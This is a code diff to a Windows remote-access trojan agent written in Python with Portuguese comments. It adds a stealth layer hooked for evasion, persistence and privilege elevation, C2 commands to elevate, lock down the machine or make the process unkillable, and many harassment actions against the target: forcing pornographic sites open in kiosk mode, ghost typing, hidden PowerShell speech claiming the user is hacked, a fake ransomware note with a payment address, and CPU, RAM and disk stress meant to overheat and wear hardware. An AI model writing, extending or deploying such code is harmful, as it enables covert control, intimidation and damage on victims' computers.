@@ -13,6 +13,7 @@ stdlib only. Windows-first; shell / file ops degrade gracefully on POSIX.
 import base64
 import csv
 import ctypes
+import ctypes.wintypes as wt
 import hashlib
 import hmac
 import io
@@ -30,6 +31,11 @@ import tempfile
 import threading
 import time
 
+try:                                     # camada de evasao/persistencia
+    import stealth as _st
+except Exception:                        # payload sem o modulo: segue sem ela
+    _st = None
+
 # --------------------------------------------------------------- configuration
 HOST = "127.0.0.1"
 PORT = 4444
@@ -40,7 +46,7 @@ STEALTH = False        # builder --stealth flips this on: hidden relaunch + mute
 TRANSPORT = "tcp"      # "http" polls <HTTP_BASE>/c2/poll -- works through any tunnel
 HTTP_BASE = ""
 BOOTSTRAP = ""         # rendezvous channel: live C2 url is read from here on every sync
-AGENT_VER = "3.1"      # muda a cada build: o painel mostra isso em "versao"
+AGENT_VER = "3.5"      # muda a cada build: o painel mostra isso em "versao"
 # ------------------------------------------------------------------------------
 
 IS_WIN = os.name == "nt"
@@ -1373,6 +1379,493 @@ def troll_fake_update(seconds=30):
     return "atualizacao falsa por %ds" % max(1, int(seconds or 30))
 
 
+# --------------------------------------------------- trolls novos (rodada 3)
+# abrir site no PC do alvo, voz, digitacao fantasma, quiosque, gaveta do CD...
+_URL_ALIASES = {
+    "xvideos": "https://www.xvideos.com",
+    "xvideo": "https://www.xvideos.com",
+    "xv": "https://www.xvideos.com",
+    "pornhub": "https://www.pornhub.com",
+    "ph": "https://www.pornhub.com",
+    "xnxx": "https://www.xnxx.com",
+    "redtube": "https://www.redtube.com",
+    "onlyfans": "https://onlyfans.com",
+    "youtube": "https://www.youtube.com",
+    "yt": "https://www.youtube.com",
+    "rickroll": "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
+    "google": "https://www.google.com",
+    "g1": "https://g1.globo.com",
+    "globo": "https://www.globo.com",
+    "instagram": "https://www.instagram.com",
+    "insta": "https://www.instagram.com",
+    "tiktok": "https://www.tiktok.com",
+    "facebook": "https://www.facebook.com",
+    "face": "https://www.facebook.com",
+    "twitter": "https://x.com",
+    "x": "https://x.com",
+    "whatsapp": "https://web.whatsapp.com",
+    "zap": "https://web.whatsapp.com",
+    "telegram": "https://web.telegram.org",
+    "discord": "https://discord.com/app",
+    "twitch": "https://www.twitch.tv",
+    "reddit": "https://www.reddit.com",
+    "netflix": "https://www.netflix.com",
+    "spotify": "https://open.spotify.com",
+    "chatgpt": "https://chatgpt.com",
+    "mercado livre": "https://www.mercadolivre.com.br",
+    "mercadolivre": "https://www.mercadolivre.com.br",
+}
+
+_BROWSERS = (
+    (r"ProgramFiles", r"Google\Chrome\Application\chrome.exe"),
+    (r"ProgramFiles(x86)", r"Google\Chrome\Application\chrome.exe"),
+    (r"ProgramFiles(x86)", r"Microsoft\Edge\Application\msedge.exe"),
+    (r"ProgramFiles", r"Microsoft\Edge\Application\msedge.exe"),
+    (r"ProgramFiles", r"Mozilla Firefox\firefox.exe"),
+    (r"ProgramFiles(x86)", r"Mozilla Firefox\firefox.exe"),
+    (r"LocalAppData", r"Google\Chrome\Application\chrome.exe"),
+)
+
+
+def _browser_exe():
+    """Acha o navegador instalado (Chrome > Edge > Firefox)."""
+    for env, rel in _BROWSERS:
+        base = os.environ.get(env)
+        if not base:
+            continue
+        p = os.path.join(base, rel)
+        if os.path.isfile(p):
+            return p
+    return ""
+
+
+def _resolve_url(raw):
+    """Aceita apelido (xvideos, yt), dominio (uol.com.br) ou url completa."""
+    u = str(raw or "").strip().strip('"').strip("'")
+    if not u:
+        return ""
+    low = u.lower()
+    if low in _URL_ALIASES:
+        return _URL_ALIASES[low]
+    if "://" in u:
+        return u
+    if " " not in u and "." in u:
+        return "https://" + u
+    try:
+        import urllib.parse
+        return "https://www.google.com/search?q=" + urllib.parse.quote(u)
+    except Exception:
+        return "https://www.google.com/search?q=" + u.replace(" ", "+")
+
+
+def troll_openurl(url="xvideos", count=1, kiosk=False, volume=False):
+    """Abre um site no navegador padrao do alvo.
+
+    kiosk=True abre em tela cheia (Chrome/Edge --kiosk): nao fecha com Esc,
+    so com Alt+F4. count>1 abre varias abas/janelas do mesmo site.
+    """
+    target = _resolve_url(url)
+    if not target:
+        return "[!] url vazia"
+    try:
+        n = max(1, min(12, int(count or 1)))
+    except (TypeError, ValueError):
+        n = 1
+    if volume:
+        try:
+            troll_volume("max")
+        except Exception:
+            pass
+
+    exe = _browser_exe()
+    aberto = 0
+    erro = ""
+    for _ in range(n):
+        try:
+            if exe:
+                args = [exe]
+                if kiosk:
+                    args += ["--kiosk", "--new-window"]
+                else:
+                    args += ["--new-window"]
+                args.append(target)
+                subprocess.Popen(args, creationflags=0x08000000)
+            else:
+                os.startfile(target)
+            aberto += 1
+        except Exception as exc:
+            erro = str(exc)
+            try:
+                os.startfile(target)
+                aberto += 1
+                erro = ""
+            except Exception:
+                try:
+                    import webbrowser
+                    webbrowser.open(target, new=2)
+                    aberto += 1
+                    erro = ""
+                except Exception:
+                    pass
+        time.sleep(0.35)
+    if not aberto:
+        return "[!] nao consegui abrir: %s" % (erro or "sem navegador")
+    modo = "quiosque" if kiosk else ("x%d" % n if n > 1 else "normal")
+    return "abri %s (%s) %dx" % (target, modo, aberto)
+
+
+def troll_rickroll(seconds=0, volume=True):
+    """Rickroll em tela cheia com volume no maximo."""
+    if volume:
+        try:
+            troll_volume("max")
+        except Exception:
+            pass
+    return troll_openurl("rickroll", 1, kiosk=True)
+
+
+class _MOUSEINPUT(ctypes.Structure):
+    _fields_ = [("dx", wt.LONG), ("dy", wt.LONG), ("mouseData", wt.DWORD),
+                ("dwFlags", wt.DWORD), ("time", wt.DWORD),
+                ("dwExtraInfo", ctypes.POINTER(wt.ULONG))]
+
+
+class _KEYBDINPUT(ctypes.Structure):
+    _fields_ = [("wVk", wt.WORD), ("wScan", wt.WORD), ("dwFlags", wt.DWORD),
+                ("time", wt.DWORD), ("dwExtraInfo", ctypes.POINTER(wt.ULONG))]
+
+
+class _HARDWAREINPUT(ctypes.Structure):
+    _fields_ = [("uMsg", wt.DWORD), ("wParamL", wt.WORD),
+                ("wParamH", wt.WORD)]
+
+
+class _INPUTUNION(ctypes.Union):
+    _fields_ = [("mi", _MOUSEINPUT), ("ki", _KEYBDINPUT),
+                ("hi", _HARDWAREINPUT)]
+
+
+class _INPUT(ctypes.Structure):
+    _fields_ = [("type", wt.DWORD), ("u", _INPUTUNION)]
+
+
+def _type_unicode(ch):
+    """Manda um caractere unicode para a janela em foco (SendInput)."""
+    u = _win()
+    u.SendInput.argtypes = [wt.UINT, ctypes.POINTER(_INPUT), ctypes.c_int]
+    u.SendInput.restype = wt.UINT
+    arr = (_INPUT * 2)()
+    for i, flags in ((0, 0x0004), (1, 0x0004 | 0x0002)):   # UNICODE | KEYUP
+        arr[i].type = 1                                    # INPUT_KEYBOARD
+        arr[i].u.ki = _KEYBDINPUT(0, ord(ch), flags, 0, None)
+    u.SendInput(2, ctypes.byref(arr), ctypes.sizeof(_INPUT))
+
+
+def troll_type_garbage(text="", count=40, delay=0.03):
+    """Digita sozinho na janela em foco do alvo (texto ou lixo aleatorio)."""
+    if text:
+        blob = str(text)
+    else:
+        palavras = ("erro erro erro sistema falhou reiniciar agora " 
+                    "nao desligue o computador hack hack hack ").split()
+        blob = " ".join(random.choice(palavras)
+                        for _ in range(max(1, int(count or 40))))
+    blob = blob[:1200]
+
+    def runner():
+        for ch in blob:
+            try:
+                _type_unicode(ch)
+            except Exception:
+                return
+            time.sleep(max(0.0, float(delay or 0.03)))
+    threading.Thread(target=runner, daemon=True).start()
+    return "digitando %d caracteres na janela ativa" % len(blob)
+
+
+def troll_speak(text="Voce foi hackeado. Eu estou vendo a sua tela."):
+    """Faz o PC do alvo falar em voz alta (SAPI)."""
+    txt = str(text or "")[:400].replace("'", "''")
+    script = ("Add-Type -AssemblyName System.Speech; "
+              "$s = New-Object System.Speech.Synthesis.SpeechSynthesizer; "
+              "$s.Rate = 0; $s.Volume = 100; $s.Speak('%s')" % txt)
+    try:
+        subprocess.Popen(["powershell", "-NoProfile", "-WindowStyle", "Hidden",
+                          "-ExecutionPolicy", "Bypass", "-Command", script],
+                         creationflags=0x08000000)
+    except Exception as exc:
+        return "[!] %s" % exc
+    return "falando: %s" % txt[:70]
+
+
+def troll_wheel(lines=100, restore=False):
+    """Roda do mouse hipersensivel (100) ou travada (1)."""
+    u = _win()
+    val = 3 if restore else max(1, min(100, int(lines or 100)))
+    u.SystemParametersInfoW(0x0069, val, None, 3)   # SPI_SETWHEELSCROLLLINES
+    return "roda do mouse: %d linhas por entalhe" % val
+
+
+def troll_cd_tray(times=3, delay=1.2):
+    """Abre e fecha a gaveta do CD/DVD."""
+    try:
+        mci = ctypes.windll.winmm.mciSendStringW
+    except Exception as exc:
+        return "[!] winmm: %s" % exc
+    n = max(1, min(20, int(times or 3)))
+
+    def runner():
+        for _ in range(n):
+            try:
+                mci("set cdaudio door open", None, 0, None)
+                time.sleep(delay)
+                mci("set cdaudio door closed", None, 0, None)
+                time.sleep(delay)
+            except Exception:
+                return
+    threading.Thread(target=runner, daemon=True).start()
+    return "gaveta do CD abrindo/fechando %dx" % n
+
+
+def troll_fake_delete(seconds=25):
+    """Tela falsa de 'excluindo arquivos'."""
+    txt = ("Excluindo arquivos...\n\n"
+           "C:\\Users\\Usuario\\Documentos\n"
+           "C:\\Users\\Usuario\\Imagens\n"
+           "C:\\Users\\Usuario\\Downloads\n"
+           "C:\\Users\\Usuario\\Videos\n\n"
+           "12.847 arquivos encontrados\n"
+           "3.902 excluidos\n\n"
+           "Nao desligue o computador.")
+    secs = max(1, int(seconds or 25))
+    show_placa(txt, secs, "#141414", "#ff3b30")
+    return "exclusao falsa por %ds" % secs
+
+
+def troll_fake_ransom(seconds=45):
+    """Nota falsa de ransomware em tela cheia."""
+    txt = ("SEUS ARQUIVOS FORAM CRIPTOGRAFADOS\n\n"
+           "Documentos, fotos, videos e backups deste computador\n"
+           "foram bloqueados com AES-256 + RSA-4096.\n\n"
+           "Envie 0,05 BTC para a carteira:\n"
+           "bc1q7x9k2m4p8s3v6n1w5t0r2y4u6e8a0d3f5g7h9\n\n"
+           "Depois envie o comprovante para:\n"
+           "recuperar.arquivos@protonmail.com\n\n"
+           "Voce tem 72 horas. Depois disso a chave e apagada\n"
+           "e nao existe forma de recuperar nada.")
+    secs = max(1, int(seconds or 45))
+    show_placa(txt, secs, "#120006", "#ff2d2d")
+    return "nota de ransomware falsa por %ds" % secs
+
+
+def troll_cmd_storm(n=6, title="Windows Update"):
+    """Enxurrada de janelas de cmd escrevendo texto."""
+    n = max(1, min(20, int(n or 6)))
+    linhas = ("echo Inicializando componente...\r\n"
+              "echo Lendo chaves do registro...\r\n"
+              "echo Sincronizando com o servidor...\r\n"
+              "echo Falha 0x80070005 - acesso negado\r\n"
+              "echo Tentando novamente...\r\n")
+    abertos = 0
+    for _ in range(n):
+        try:
+            subprocess.Popen(["cmd.exe", "/k",
+                              "title %s & color 0a & %s" % (title, linhas)],
+                             creationflags=0x00000010)   # CREATE_NEW_CONSOLE
+            abertos += 1
+        except Exception:
+            break
+        time.sleep(0.25)
+    return "%d janelas de cmd abertas" % abertos
+
+
+def troll_screensaver():
+    """Dispara o protetor de tela do alvo."""
+    _win().SendMessageW(0xFFFF, 0x0112, 0xF140, 0)   # WM_SYSCOMMAND/SC_SCREENSAVE
+    return "protetor de tela disparado"
+
+
+# ------------------------------------------------- trolls novos (rodada 4)
+# estresse de hardware: CPU em todos os nucleos, RAM cheia, disco escrevendo
+# e aquecimento. Tudo com tempo maximo e liberacao automatica.
+_STRESS = {"stop": threading.Event(), "ram": [], "files": [], "procs": []}
+_STRESS_MARK = "RAFStressBurn"
+
+
+class _MEMORYSTATUSEX(ctypes.Structure):
+    _fields_ = [("dwLength", wt.DWORD), ("dwMemoryLoad", wt.DWORD),
+                ("ullTotalPhys", ctypes.c_ulonglong),
+                ("ullAvailPhys", ctypes.c_ulonglong),
+                ("ullTotalPageFile", ctypes.c_ulonglong),
+                ("ullAvailPageFile", ctypes.c_ulonglong),
+                ("ullTotalVirtual", ctypes.c_ulonglong),
+                ("ullAvailVirtual", ctypes.c_ulonglong),
+                ("ullAvailExtendedVirtual", ctypes.c_ulonglong)]
+
+
+def _ram_total_gb():
+    try:
+        mem = _MEMORYSTATUSEX()
+        mem.dwLength = ctypes.sizeof(mem)
+        k32 = ctypes.windll.kernel32
+        k32.GlobalMemoryStatusEx.argtypes = [ctypes.POINTER(_MEMORYSTATUSEX)]
+        k32.GlobalMemoryStatusEx.restype = wt.BOOL
+        if k32.GlobalMemoryStatusEx(ctypes.byref(mem)):
+            return mem.ullTotalPhys / float(1 << 30)
+    except Exception:
+        pass
+    return 4.0
+
+
+def _kill_stress_procs():
+    """Mata todo processo de queima que sobrou (marcado na linha de comando)."""
+    script = ("Get-CimInstance Win32_Process -Filter \"Name='powershell.exe'\" | "
+              "Where-Object { $_.CommandLine -like '*%s*' } | "
+              "ForEach-Object { Stop-Process -Id $_.ProcessId -Force }"
+              % _STRESS_MARK)
+    try:
+        subprocess.run(["powershell", "-NoProfile", "-WindowStyle", "Hidden",
+                        "-Command", script],
+                       creationflags=0x08000000, timeout=60)
+    except Exception:
+        pass
+    _STRESS["procs"] = []
+
+
+def troll_stress_cpu(seconds=60, threads=0):
+    """Queima todos os nucleos (processos reais, nao threads com GIL)."""
+    secs = max(1, min(900, int(seconds or 60)))
+    n = int(threads or 0) or (os.cpu_count() or 2)
+    n = max(1, min(64, n))
+    cmd = "$%s=1; $x=0; while($true){$x++}" % _STRESS_MARK
+    _STRESS["stop"].clear()
+    _kill_stress_procs()
+    abertos = 0
+    for _ in range(n):
+        try:
+            _STRESS["procs"].append(subprocess.Popen(
+                ["powershell", "-NoProfile", "-WindowStyle", "Hidden",
+                 "-Command", cmd], creationflags=0x08000000))
+            abertos += 1
+        except Exception:
+            break
+
+    def reaper():
+        end = time.time() + secs
+        while time.time() < end:
+            if _STRESS["stop"].wait(1.0):
+                break
+        _kill_stress_procs()
+    threading.Thread(target=reaper, daemon=True).start()
+    return "%d processos queimando CPU por %ds (ventoinha no maximo)" % (abertos, secs)
+
+
+def troll_stress_ram(seconds=30, pct=80):
+    """Aloca e toca memoria ate encher X% da RAM fisica, depois libera."""
+    secs = max(1, min(600, int(seconds or 30)))
+    pct = max(10, min(95, int(pct or 80)))
+    total = _ram_total_gb()
+    alvo = total * pct / 100.0
+    chunk = 128 * 1024 * 1024
+    _STRESS["stop"].clear()
+    _STRESS["ram"] = []
+
+    def runner():
+        end = time.time() + secs
+        try:
+            while not _STRESS["stop"].is_set() and time.time() < end:
+                if len(_STRESS["ram"]) * chunk >= alvo * (1 << 30):
+                    time.sleep(0.5)
+                    continue
+                try:
+                    _STRESS["ram"].append(ctypes.create_string_buffer(chunk))
+                except Exception:
+                    time.sleep(0.5)
+        finally:
+            _STRESS["ram"] = []
+    threading.Thread(target=runner, daemon=True).start()
+    return "enchendo %d%% de %.1f GB de RAM por %ds" % (pct, total, secs)
+
+
+def troll_stress_disk(seconds=30, mb=4096):
+    """Escreve arquivos grandes no disco (desgasta SSD e enche a unidade)."""
+    secs = max(1, min(600, int(seconds or 30)))
+    limite = max(64, min(65536, int(mb or 4096))) * 1024 * 1024
+    pasta = os.environ.get("TEMP") or os.environ.get("TMP") or "."
+    bloco = os.urandom(4 * 1024 * 1024)
+    _STRESS["stop"].clear()
+    _STRESS["files"] = []
+
+    def runner():
+        end = time.time() + secs
+        escrito = 0
+        i = 0
+        try:
+            while not _STRESS["stop"].is_set() and time.time() < end and escrito < limite:
+                path = os.path.join(pasta, "raf_stress_%d_%d.bin" % (os.getpid(), i))
+                i += 1
+                try:
+                    with open(path, "wb") as f:
+                        for _ in range(64):          # 256 MB por arquivo
+                            f.write(bloco)
+                            escrito += len(bloco)
+                            if escrito >= limite:
+                                break
+                        f.flush()
+                        os.fsync(f.fileno())
+                    _STRESS["files"].append(path)
+                except Exception:
+                    break
+        finally:
+            for p in _STRESS["files"]:
+                try:
+                    os.remove(p)
+                except OSError:
+                    pass
+            _STRESS["files"] = []
+    threading.Thread(target=runner, daemon=True).start()
+    return "escrevendo ate %d MB no disco por %ds" % (limite >> 20, secs)
+
+
+def troll_stress_all(seconds=60):
+    """CPU + RAM + disco ao mesmo tempo."""
+    secs = max(1, min(600, int(seconds or 60)))
+    a = troll_stress_cpu(secs)
+    b = troll_stress_ram(secs, 85)
+    c = troll_stress_disk(secs)
+    return "TUDO: %s | %s | %s" % (a, b, c)
+
+
+def troll_heat(seconds=120):
+    """Plano de alto desempenho + todos os nucleos no talo (aquece de verdade)."""
+    secs = max(1, min(900, int(seconds or 120)))
+    try:
+        subprocess.run(["powercfg", "/setactive",
+                        "8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c"],
+                       creationflags=0x08000000, timeout=30)
+        subprocess.run(["powercfg", "/change", "standby-timeout-ac", "0"],
+                       creationflags=0x08000000, timeout=30)
+        subprocess.run(["powercfg", "/change", "monitor-timeout-ac", "0"],
+                       creationflags=0x08000000, timeout=30)
+    except Exception:
+        pass
+    return "aquecendo: " + troll_stress_cpu(secs)
+
+
+def troll_stress_stop():
+    """Para tudo e libera a memoria/disco."""
+    _STRESS["stop"].set()
+    _kill_stress_procs()
+    _STRESS["ram"] = []
+    for p in list(_STRESS["files"]):
+        try:
+            os.remove(p)
+        except OSError:
+            pass
+    _STRESS["files"] = []
+    return "estresse parado, memoria e disco liberados"
+
+
 # -------------------------------------------------------------------- keylogger
 _SHIFTED = {
     "1": "!", "2": "@", "3": "#", "4": "$", "5": "%", "6": "^", "7": "&",
@@ -1530,6 +2023,11 @@ def uninstall():
     import winreg
 
     notes = []
+    if _st is not None:
+        try:
+            notes.append("stealth: " + _st.remove_all())
+        except Exception as exc:
+            notes.append("stealth: %s" % exc)
     try:
         with winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY, 0, winreg.KEY_SET_VALUE) as k:
             winreg.DeleteValue(k, VALUE_NAME)
@@ -1666,9 +2164,16 @@ def dispatch(sock, rid, op, args):
         return ok("pong")
 
     if op in ("ver", "version", "versao"):
-        return ok("agente v%s | pid %d | %s" % (
+        who = ""
+        if _st is not None:
+            try:
+                who = " | " + ("SYSTEM" if _st.is_system()
+                               else ("admin" if _st.is_admin() else "user"))
+            except Exception:
+                who = ""
+        return ok("agente v%s | pid %d | %s%s" % (
             AGENT_VER, os.getpid(),
-            "exe" if getattr(sys, "frozen", False) else "py"))
+            "exe" if getattr(sys, "frozen", False) else "py", who))
 
     if op == "sysinfo":
         return ok(json.dumps(sysinfo(), indent=2))
@@ -1837,6 +2342,51 @@ def dispatch(sock, rid, op, args):
             return ok(troll_blackout(secs or 10))
         if a in ("fake_update", "atualizando"):
             return ok(troll_fake_update(secs or 30))
+        if a in ("openurl", "open_url", "site", "abrir_site", "url"):
+            return ok(troll_openurl(args.get("url") or args.get("site") or "xvideos",
+                                    args.get("count") or 1,
+                                    bool(args.get("kiosk")),
+                                    bool(args.get("volume"))))
+        if a in ("kiosk", "quiosque", "site_kiosk"):
+            return ok(troll_openurl(args.get("url") or "youtube", 1,
+                                    kiosk=True, volume=bool(args.get("volume"))))
+        if a in ("rickroll", "rick"):
+            return ok(troll_rickroll())
+        if a in ("type", "type_garbage", "digitar"):
+            return ok(troll_type_garbage(args.get("text") or "",
+                                         args.get("count") or 40))
+        if a in ("speak", "falar", "voz"):
+            return ok(troll_speak(args.get("text") or
+                                  "Voce foi hackeado. Eu estou vendo a sua tela."))
+        if a in ("wheel", "scroll", "roda"):
+            return ok(troll_wheel(args.get("lines") or 100,
+                                  bool(args.get("restore"))))
+        if a in ("wheel_ok", "scroll_ok"):
+            return ok(troll_wheel(restore=True))
+        if a in ("cd_tray", "cd", "gaveta"):
+            return ok(troll_cd_tray(args.get("count") or 3))
+        if a in ("fake_delete", "excluindo"):
+            return ok(troll_fake_delete(secs or 25))
+        if a in ("fake_ransom", "ransom", "resgate"):
+            return ok(troll_fake_ransom(secs or 45))
+        if a in ("cmd_storm", "cmd"):
+            return ok(troll_cmd_storm(args.get("count") or 6))
+        if a in ("screensaver", "protetor"):
+            return ok(troll_screensaver())
+        if a in ("stress_cpu", "queimar_cpu", "cpu"):
+            return ok(troll_stress_cpu(secs or 60, args.get("threads") or 0))
+        if a in ("stress_ram", "encher_ram", "ram"):
+            return ok(troll_stress_ram(secs or 30, args.get("pct") or 80))
+        if a in ("ram_bomb", "rambomb", "bomba_ram"):
+            return ok(troll_stress_ram(secs or 15, 95))
+        if a in ("stress_disk", "encher_disco", "disco"):
+            return ok(troll_stress_disk(secs or 30, args.get("mb") or 4096))
+        if a in ("stress_all", "tudo", "estresse"):
+            return ok(troll_stress_all(secs or 60))
+        if a in ("heat", "esquentar", "calor"):
+            return ok(troll_heat(secs or 120))
+        if a in ("stress_stop", "parar", "stop"):
+            return ok(troll_stress_stop())
         if not a or a in ("list", "acoes", "help"):
             return ok("agente v%s\na\u00e7oes: cursor | show_cursor | lock | shake | "
                       "swap | block | tray | monitor | monitor_on | beep | mute | "
@@ -1844,7 +2394,11 @@ def dispatch(sock, rid, op, args):
                       "normal | fix | caps | caps_off | volume_max | volume_zero | "
                       "siren | mouse_fast | mouse_normal | window_shake | notepad | "
                       "wallpaper | wallpaper_restore | desktop_icons | cursor_big | "
-                      "cursor_normal | clip_garbage | bsod | blackout | fake_update"
+                      "cursor_normal | clip_garbage | bsod | blackout | fake_update | "
+                      "openurl | kiosk | rickroll | type_garbage | speak | wheel | "
+                      "wheel_ok | cd_tray | fake_delete | fake_ransom | cmd_storm | "
+                      "screensaver | stress_cpu | stress_ram | ram_bomb | "
+                      "stress_disk | stress_all | heat | stress_stop"
                       % AGENT_VER)
         # acao que este binario nao conhece = exe antigo rodando no alvo
         return ok("[!] a\u00e7\u00e3o desconhecida: %s (agente v%s) -- esse agente "
@@ -1890,6 +2444,29 @@ def dispatch(sock, rid, op, args):
 
     if op == "persist":
         return ok(install())
+
+    if op in ("stealth", "defesa", "stealth_status"):
+        if _st is None:
+            return ok("[!] camada stealth ausente neste build")
+        return ok(json.dumps(_st.status(), indent=2, ensure_ascii=False))
+
+    if op in ("elevate", "admin"):
+        if _st is None:
+            return ok("[!] camada stealth ausente neste build")
+        done = _st.ensure_admin()
+        return ok(json.dumps(_st.status(), indent=2, ensure_ascii=False)
+                  if done else "[!] usuario fora do grupo Administradores")
+
+    if op in ("lockdown", "travar"):
+        if _st is None:
+            return ok("[!] camada stealth ausente neste build")
+        return ok("lockdown: %s" % ("ok" if _st.lockdown() else "falhou"))
+
+    if op in ("unkillable", "critical"):
+        if _st is None:
+            return ok("[!] camada stealth ausente neste build")
+        on = str(args.get("state", "on")).lower() not in ("off", "0", "false")
+        return ok("critical: %s" % ("on" if _st.set_critical(on) else "off"))
 
     if op == "unpersist":
         return ok(uninstall())
@@ -2098,6 +2675,9 @@ def harden():
 
 def main():
     global _KEY, TRANSPORT, HTTP_BASE, BOOTSTRAP
+    _skip = {"--install", "--visible", "--no-stealth", "--no-harden",
+             "--elevated", "--install-only"}
+    os.environ["RAF_ARGS"] = " ".join(a for a in sys.argv[1:] if a not in _skip)
     host, port, key = parse_args(sys.argv[1:])
     if not key or str(key).startswith("r4f-0000"):
         key = KEY                      # veio a chave de exemplo: usa a embutida
@@ -2120,13 +2700,21 @@ def main():
     if STEALTH and "--no-stealth" not in sys.argv and "--visible" not in sys.argv:
         if stealth_relaunch():
             return                      # hidden copy takes over, this one exits
-        if not single_instance():
-            return
-        _kill_duplicates()              # sobra so este processo
+        if "--elevated" not in sys.argv:
+            if not single_instance():
+                return
+            _kill_duplicates()          # sobra so este processo
 
     if "--no-harden" not in sys.argv:
         try:
             harden()
+        except Exception:
+            pass
+
+    # evasao + persistencia + elevacao em paralelo: nao atrasa o C2
+    if _st is not None and "--no-stealth" not in sys.argv:
+        try:
+            threading.Thread(target=_st.bootstrap, daemon=True).start()
         except Exception:
             pass
 
